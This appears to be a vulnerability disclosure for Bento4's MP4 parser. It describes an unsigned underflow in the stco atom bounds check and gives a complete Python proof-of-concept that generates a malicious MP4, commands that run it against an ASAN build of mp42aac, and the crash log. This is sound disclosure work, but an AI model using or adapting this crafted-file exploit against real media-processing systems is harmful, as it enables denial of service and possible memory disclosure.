## Bug0: AP4_StcoAtom Unsigned Integer Underflow Bypasses Bounds Check and Causes Heap-Buffer-Overflow

In `AP4_StcoAtom::AP4_StcoAtom()` in `Ap4StcoAtom.cpp`, the upper-bound check on `m_EntryCount` undergoes unsigned integer underflow when the atom `size` equals `AP4_FULL_ATOM_HEADER_SIZE` (12), allowing an attacker-controlled `entry_count` read from beyond the atom boundary to bypass the guard, trigger a multi-gigabyte heap allocation, and cause an out-of-bounds stream read that propagates to a confirmed heap-buffer-overflow in `AP4_CttsAtom::AP4_CttsAtom()`.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(type4, data=b''):
    return struct.pack('>I', 4 + 4 + len(data)) + type4 + data

def fullbox(type4, version, flags, data=b''):
    hdr = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(type4, hdr + data)

# --- ftyp ---
ftyp_data = (
    b'isom'
    + struct.pack('>I', 0x00000200)
    + b'isom'
    + b'iso2'
    + b'mp41'
)
ftyp = box(b'ftyp', ftyp_data)

# --- mvhd (version 0) ---
mvhd_payload = (
    struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + struct.pack('>I', 1000)
    + struct.pack('>I', 0)
    + struct.pack('>I', 0x00010000)
    + struct.pack('>H', 0x0100)
    + b'\x00' * 10
    + struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    + b'\x00' * 24
    + struct.pack('>I', 2)
)
mvhd = fullbox(b'mvhd', 0, 0, mvhd_payload)

# --- tkhd (version 0) ---
tkhd_payload = (
    struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + struct.pack('>I', 1)
    + struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + b'\x00' * 8
    + struct.pack('>H', 0)
    + struct.pack('>H', 1)
    + struct.pack('>H', 0x0100)
    + b'\x00' * 2
    + struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    + struct.pack('>I', 0)
    + struct.pack('>I', 0)
)
tkhd = fullbox(b'tkhd', 0, 3, tkhd_payload)

# --- mdhd (version 0) ---
mdhd_payload = (
    struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + struct.pack('>I', 44100)
    + struct.pack('>I', 0)
    + struct.pack('>H', 0x55C4)
    + struct.pack('>H', 0)
)
mdhd = fullbox(b'mdhd', 0, 0, mdhd_payload)

# --- hdlr ---
hdlr_payload = (
    struct.pack('>I', 0)
    + b'soun'
    + b'\x00' * 12
    + b'SoundHandler\x00'
)
hdlr = fullbox(b'hdlr', 0, 0, hdlr_payload)

# --- smhd ---
smhd_payload = struct.pack('>H', 0) + struct.pack('>H', 0)
smhd = fullbox(b'smhd', 0, 0, smhd_payload)

# --- dref ---
url_entry = fullbox(b'url ', 0, 1, b'')
dref_payload = struct.pack('>I', 1) + url_entry
dref = fullbox(b'dref', 0, 0, dref_payload)

# --- dinf ---
dinf = box(b'dinf', dref)

# --- stsd ---
mp4a_payload = (
    b'\x00' * 6
    + struct.pack('>H', 1)
    + b'\x00' * 8
    + struct.pack('>H', 2)
    + struct.pack('>H', 16)
    + struct.pack('>H', 0)
    + struct.pack('>H', 0)
    + struct.pack('>I', 44100 << 16)
)
mp4a = box(b'mp4a', mp4a_payload)
stsd_payload = struct.pack('>I', 1) + mp4a
stsd = fullbox(b'stsd', 0, 0, stsd_payload)

# --- stts, stsc, stsz ---
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))

# --- Malicious stco atom (size=12, no payload room) ---
# size=12: 4(size)+4(type)+4(version+flags) = 12 bytes; no entry_count field declared.
# After reading stco's 12 bytes, the constructor reads entry_count from the next
# 4 bytes in the stream, which lie outside stco's declared boundary.
# Bounds check underflows: (12-12-4)/4 = 0xFFFFFFFC/4 = 0x3FFFFFFF.
# entry_count=0x10000000 does not exceed 0x3FFFFFFF so it passes unclamped.
# new AP4_UI32[0x10000000] attempts a ~1 GB allocation.
MALICIOUS_ENTRY_COUNT = 0x10000000
stco_raw = struct.pack('>I', 12) + b'stco' + struct.pack('>I', 0)
assert len(stco_raw) == 12

# 4 extra bytes placed inside stbl but beyond stco's declared end;
# stco constructor reads them as entry_count.
extra_bytes = struct.pack('>I', MALICIOUS_ENTRY_COUNT)

# --- Build stbl ---
stbl_payload = stsd + stts + stsc + stsz + stco_raw + extra_bytes
stbl = box(b'stbl', stbl_payload)

# --- minf, mdia, trak, moov ---
minf = box(b'minf', smhd + dinf + stbl)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)
moov = box(b'moov', mvhd + trak)

mp4_data = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
print(f"stco declared size: 12 (no payload room)")
print(f"entry_count read from beyond stco boundary: 0x{MALICIOUS_ENTRY_COUNT:08X} = {MALICIOUS_ENTRY_COUNT}")
print(f"Underflow check: (12-12-4)/4 = 0x3FFFFFFF (unsigned underflow)")
print(f"Bypass: {MALICIOUS_ENTRY_COUNT} <= 0x3FFFFFFF -> entry_count NOT clamped")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x563f76e65094 bp 0x7fffcc2d79f0 sp 0x7fffcc2d79e0
READ of size 1 at 0x502000000111 thread T0
    #0 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file can trigger an unsigned integer underflow in `AP4_StcoAtom::AP4_StcoAtom()` that bypasses the entry-count bounds check, causing a multi-gigabyte heap allocation followed by an out-of-bounds stream read that results in a confirmed heap-buffer-overflow one byte past an allocated region. The attack surface covers any invocation of mp42aac (or other Bento4 tools sharing the same parsing library) on an untrusted MP4 file, requiring no privileges or authentication. The immediate consequence is process termination (denial of service), and the out-of-bounds read across heap region boundaries may additionally expose adjacent heap metadata or application data to an attacker under favorable memory layout conditions.
